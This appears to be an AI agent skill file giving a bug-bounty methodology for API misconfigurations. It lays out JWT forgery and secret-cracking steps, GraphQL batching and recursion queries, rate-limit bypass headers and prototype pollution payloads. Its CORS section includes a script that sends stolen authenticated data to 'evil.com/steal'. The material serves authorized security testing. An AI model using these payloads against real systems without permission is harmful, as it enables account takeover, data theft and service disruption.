---
name: hunt-api-misconfig
description: |
  API security misconfiguration hunting. JWT attacks (none algorithm, alg confusion,
  weak secret), GraphQL introspection + batching + auth bypass, CORS
  misconfiguration, mass assignment, rate limit bypass, API versioning flaws,
  and prototype pollution.
triggers:
  - hunt api
  - api security testing
  - jwt attacks
  - graphql testing
  - cors misconfiguration
  - mass assignment
  - api misconfiguration
  - rest api testing
category: security
---
# API Misconfiguration Hunting

Adapted from Claude-BugHunter by ElementalSouls.

---

## JWT Attacks

### Step 1: Decode and Inspect
```bash
# Decode JWT header + payload (base64)
echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
```
**Check:**
- Algorithm in header (`alg`)
- Claims: `sub`, `iat`, `exp`, `aud`, `iss`, `jti`, `role`, `admin`
- Is `kid` (key ID) specified? → Path traversal potential
- Is the token expired? (sometimes not validated)

### Step 2: None Algorithm Attack
Change header `alg` from `RS256` / `HS256` / `ES256` to `"none"` and remove the signature:
```
Header:  {"alg":"none","typ":"JWT"}
Payload: {"sub":"1234567890","name":"John Doe","admin":true}
Signature: (empty)
```
Encode as: `BASE64(header).BASE64(payload).`

### Step 3: Algorithm Confusion (RS256 → HS256)
If the public key is accessible:
```bash
# If the server uses RS256 but accepts HS256 with the public key as the secret:
jwt_tool <JWT> -X a -pb cat public.pem
# Or python:
# jwt.encode(payload, public_key, algorithm='HS256')
```

### Step 4: Weak Secret Bruteforce
```bash
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
jwt_tool <JWT> -C -d ~/wordlists/rockyou.txt
```

### Step 5: Check Claims
```bash
# Modify 'sub' to another user's ID
# Add 'admin: true' or 'role: admin'
# Check if 'aud' validation is missing
# Check if 'iss' validation is missing
# Check 'exp' — does server actually validate it?
```

### Step 6: JWK Injection
If the server accepts the `jku` or `jwk` header:
- Provide your own JWK Set URL with your public key
- Server fetches your key and validates the JWT with it

### Step 7: Kid Injection / Path Traversal
```json
{"kid": "../../../dev/null", "alg": "HS256", "typ": "JWT"}
```
If the server uses `kid` to fetch a file and `dev/null` returns empty → you can sign with an empty key.

---

## GraphQL Testing

### Introspection
```graphql
query {
  __schema {
    types {
      name
      fields { name, type { name } }
    }
  }
}
```
**If enabled:** Dump entire schema. Look for:
- `mutation` types (writes, deletes)
- Admin mutations (`deleteUser`, `impersonate`, `resetPassword`)
- Fields with interesting names (`ssn`, `token`, `creditCard`)
- Internal service endpoints

### Batching Attack
```graphql
query {
  user1: user(id: 123) { email, ssn }
  user2: user(id: 124) { email, ssn }
  user3: user(id: 125) { email, ssn }
  # ... up to hundreds in one query
}
```
**Check:** Does the API enforce field-level authorization or just endpoint-level?

### Auth Bypass via Introspection
```graphql
mutation {
  deleteUser(id: 123) {
    id
  }
}
```
**Check:** Is the mutation discoverable via introspection but not protected?

### Deep Recursion / DoS
```graphql
query {
  user(id: 123) {
    friends { user { friends { user { friends { ... } } } } }
  }
}
```
**Check:** Depth limits? Rate limiting on complex queries?

---

## CORS Misconfiguration

### Detection
```bash
curl -H "Origin: https://evil.com" -H "Cookie: session=abc" https://target.com/api/data
```

**Check response headers:**
- `Access-Control-Allow-Origin: https://evil.com` ← Reflects attacker origin
- `Access-Control-Allow-Credentials: true` ← Sends cookies cross-origin
- If BOTH are present → **CRITICAL** — attacker can steal authenticated data

### Payload Chain
```html
<!-- Attacker's site -->
<script>
fetch('https://target.com/api/user/data', {
  credentials: 'include'
}).then(r => r.text()).then(d =>
  fetch('https://evil.com/steal?data=' + encodeURI(d))
);
</script>
```

### CORS Wildcard Check
```bash
curl -H "Origin: null" https://target.com/api/data
curl -H "Origin: https://target.com.evil.com" https://target.com/api/data
```

---

## Rate Limit Bypass Techniques

| Technique | Payload |
|---|---|
| IP rotation | `X-Forwarded-For: 1.2.3.{4..100}` |
| Header injection | `X-Real-IP: 1.2.3.4`, `X-Originating-IP: 1.2.3.4` |
| Session rotation | New session per request (if rate-limited per session) |
| Parameter pollution | `username=user&username=user2` |
| Content-Type switch | `application/json` → `application/x-www-form-urlencoded` |
| HTTP method switch | POST → PUT → PATCH |
| Cookie removal | Remove session cookie to get anonymous rate limit pool |

---

## API Versioning Flaws

```bash
# Old API versions often have weaker auth
/v1/users/123 → 200
/v2/users/123 → 200
/v3/users/123 → 403

# Try removing version entirely
/users/123 → 200 (maybe unversioned fallback)

# Try undocumented versions
/v0/users/123
/v4/users/123
/v2beta/users/123
/2022-01-01/users/123
```

---

## Prototype Pollution (Client-Side)

Look for:
- `Object.assign(target, userInput)` in JS bundles
- `_.merge(target, userInput)` (lodash)
- `$.extend(target, userInput)` (jQuery)
- `target[userKey] = userValue` patterns

### Detection
```javascript
// In browser console
Object.prototype.polluted = "yes"
// Check if it affected the app
```

### Payloads
```json
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
```

---

## API Hunting Checklist

For every API endpoint:

- [ ] HTTP method tampering (try GET/POST/PUT/DELETE/PATCH/OPTIONS on each)
- [ ] Content-Type switching (JSON ↔ form-data ↔ XML)
- [ ] Auth header removal (what if no Bearer token?)
- [ ] Old API version accessible
- [ ] JWT alg=none, alg confusion, weak secret
- [ ] GraphQL introspection (if applicable)
- [ ] CORS misconfiguration
- [ ] Rate limiting (or lack thereof)
- [ ] Mass assignment (extra fields in request body)
- [ ] Parameter pollution (duplicate params)
- [ ] IDOR on IDs/UUIDs in API paths
- [ ] Unauthenticated admin/admin-like endpoints
